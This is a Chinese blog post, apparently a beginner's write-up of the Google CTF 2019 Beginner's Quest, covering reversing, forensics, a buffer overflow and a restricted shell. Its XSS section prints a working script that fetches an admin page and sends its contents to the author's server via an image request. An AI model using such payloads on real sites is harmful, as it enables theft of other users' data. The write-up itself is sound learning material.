---
layout: post
title: Google CTF 2019 初学者挑战之从入门到放弃
author: enh6
categories: blog
---

所谓CTF，全称[Capture the Flag](https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security)，是信息安全圈子里玩的一个比赛，以前看新闻注意到过这种活动，觉得很高端的样子。毕竟作为一个程序员，谁没有曾经想成为一个<del>大黑客</del>script kiddie呢？🐶

上周我又偶然看到了Google CTF 2019的新闻，发现有[`Beginner's Quest`](https://capturetheflag.withgoogle.com/#beginners/)，勾起了我的兴趣，于是不禁掺和了一番。

{% include image.html title="google ctf" img="google-ctf.png" caption="题目难度分为最简单，更简单，简单，中等🤔" %}

由于我以前没玩过CTF，所以并不知道要怎么玩，后来进行不下去的时候也参考了别人的write-up。这里我也把过程记录一下吧。

## Enter Space-Time Coordinates

给了一个文件，用记事本打开就能看到有`CTF{welcome_to_googlectf}`字段，然而我并不懂CTF是怎么玩的，不知道这是什么意思。。然后把头几个字节的`hex`搜了一下，发现是个`zip`格式文件。解压后是一个`ELF`可执行文件，程序可以输入坐标，输出坐标是否正确。然后用`objdump`看汇编代码也看不懂逻辑。然后用`strings`看到的还是那几个记事本打开就能看到的字符串。最后试了`CTF{...}`字段，居然还真是这个。。

收获：知道了CTF是怎么玩的了

## Satellite

给了一个`go`写的程序，首先要输入一个正确的名字，用了`go tool objdump`，找到`main`函数跳到`connectToSat`之前的判断的位置`init_sat.go:21`，感觉是输入的字符串和立即数做比较，比较7个字节，分别是`'imso'`，`'mu'`和`'\n'`，但是输入`imsomu`却不对，然后`gdb`调试，打印比较时输入字符串的值，发现是字节序的问题，应该是`osmium`。（后来回头看了题目，直接告诉了名字就是`Osmium`，我尼玛。。。）

输入正确的名字后，会发送网络请求返回一些东西，提示用`wireshark`嗅探，然而我研究搜索了半天也没发现怎么能解密`TLS`加密的内容，只能看到加密的`TLS`包。

后来想到在程序中总能看到拿到的数据吧，重新看汇编，`connectToSat`里用到了`regexp.ReplaceAllStrings`，而且返回的请求会显示一些`******`字样，而`strings`能看到有`CTF{\S{40}}`字符串。猜测是返回的数据包含`CTF{...}`，后来给替换掉了。于是继续`gdb`在`regexp`函数调用前加断点，然后检查压栈传参都传的什么参数，终于看到了替换前的字符串`CTF{4efcc72090af28fd33a2118985541f92e793477f}`。

收获：学到了`gdb`调二进制的一些知识，怎么看汇编指令，怎么看寄存器和内存，怎么汇编指令单步执行。

## Home Computer

这一关就没什么意思了。给了一个`NTFS`的`image`，`mount`了以后发现文件都是空的只有一个`txt`有内容，说是要看`NTFS`的`extended attributes`，但是这玩意儿怎么看呢，搜索一番，安装了取证工具`Sleuth Kit`，是个命令行工具，没搞清用法。于是又装了一个`GUI`叫`Autopsy`，算是能用了，找到了在`extended attributes`里藏的一张图里的`CTF{congratsyoufoundmycreds}`。

收获：无。我对这种取证工具[并没有什么好印象](https://www.google.com/search?q=mfsocket)。

## Government Agriculture Network

给了一个网站，有个admin页面但会跳转到主页，主页有个输入框可以post内容，提交了说admin会审核。研究了半天不知道是干嘛的。。不得已在网上找提示，发现有个人在twitch上直播解题，看了一下录像，才貌似明白了。（其实题目的url也说了是XSS，但我笔记本上Firefox地址栏的长度过短导致没看到，我尼玛。。）

题目的意思是输入可以XSS，admin审核的时候就中招了。但要跨站注入，我得首先有个站，不得已注册了DigitalOcean开了个VPS。还好可以按小时计费，花不了几毛钱，而且新用户也送$50等于免费。<del>（是不是要放个推广返利链接。。🤔）</del>。然后直接`python3 -m http.server 80`完事儿。

试了下`POST`一个`<img>`，确实日志里就能看到有访问。于是注入了下面这个脚本，拿到了admin页面里的`CTF{8aaa2f34b392b415601804c2f5f0f24e}`。

```
<script>
fetch('/admin').then(r => r.text()).then(t => {
var img = new Image();
img.src = 'http://MYSITEIP/' + encodeURIComponent(t);
});
</script>
```

收获：DigitalOcean账户一枚？？？

## STOP GAN (bof)

<del>给了一个MIPS的可执行文件，可以用`qemu`执行。要通过缓冲区溢出把它搞崩。</del>

我寻思这easiest的题目有这么难吗！别人写的write-up看了好几遍，才终于明白题意了，原来给的网址才是需要pwn的本体，给的附件是网址的程序的示意。亏我研究这程序个把钟头，早就能`segfault`但是一直说`could not open flag`。看汇编感觉也是从文件系统里读个玩意儿，但我自己电脑里哪来的这文件呢。

正确的打开方式是用`nc`连给的网址，然后操作。我原来用浏览器打开看了下没看出端倪，还以为只是个提示呢。只要输入一大坨字符就能缓冲区溢出显示`CTF{Why_does_cauliflower_threaten_us}`。

收获：知道了`nc`。

## Work Computer

这关也没啥意思。`nc`连网址，给了一个shell，有个flag文件，但没有`cat`等命令。看了`/bin`和`/usr/bin`，没发现啥可以显示文件内容的。后来懒得研究了，参考网上的write-up，用`tar cvf`命令显示出`CTF{4ll_D474_5h4ll_B3_Fr33}`。

收获：无。

## FriendSpaceBookPlusAllAccessRedPremium.com

这一题还挺有意思的。给了一个emoji组成的程序，一个python写的虚拟机来执行emoji。

执行会输出一个网址，但执行速度巨慢，输出几个字母就卡在那儿了。于是看执行哪里的循环比较多，是倒数第二个emoji代码块。看了好半天，觉得是naive的判断质数的算法，于是把它替换成python的筛法判断素数。这样速度快了不少，能显示出前半个网址。但后半个网址还是显示不出来，执行速度还是太慢了。

又继续看倒数第一个代码块，发现是判断回文数的。而倒数第三块调用了倒数第二和第一块。输出倒数第三个代码块的进出的数据，发现它确实是找第n个回文素数的逻辑，每执行一次，n+1，输出一个字母，只是算法过于naive和暴力🤓。于是我先算出来20000×20000内的回文素数列表，替换掉原有的逻辑，而且换用pypy3提高执行速度，终于能输出整个网址了，拿到`CTF{Peace_from_Cauli!}`。

收获：人肉解码emoji asm能力。。

## Drive to the target

给了一个网站，有一个初始坐标，你可以改动坐标，一步一步走到目的地。但问题是每一次走的距离是有限制的，速度也是有限制的，需要走很多步才行。人肉点击应该是不现实了，于是打开浏览器console，写了下面这个脚本，跑了起来。但跑了好长好长时间也没到目的地，于是再到B站刷几个视频，还没到目的地，再到YouTube刷几个视频，终于结束了，拿到`CTF{Who_is_Tardis_Ormandy}`。

```javascript
var a = +document.getElementsByTagName('input')[0].value;
var b = +document.getElementsByTagName('input')[1].value;
var token = document.getElementsByTagName('input')[2].value;

var n = 1;

function f(a, b, token, idx) {
  fetch("/?lat=" + a + "&lon=" + b + "&token=" + token)
  .then(r => r.text()).then(t => {
    var c = t.split('\n');
    token = c[14].substr(58, 140);
    console.log(a, b, token);
    console.log(c[18]);
    if (c[18].indexOf('closer') > 0 && n == idx) {
      n++;
      setTimeout(() => {f(a, b - 0.001, token, n);}, 5000);
      setTimeout(() => {f(a, b + 0.001, token, n);}, 5000);
      setTimeout(() => {f(a + 0.0005, b, token, n);}, 5000);
      setTimeout(() => {f(a - 0.0005, b, token, n);}, 5000);
    }
  });
}

f(a, b - 0.0001, token, n);
```

收获：Script kiddie称号。

## 完结

此时还有几个分支的题目没有做，但我已经决定放弃🙂。这次算是体验了一把CTF，大概知道了CTF是怎么玩的。我也没打算向信息安全领域发展，那就先这样啦。
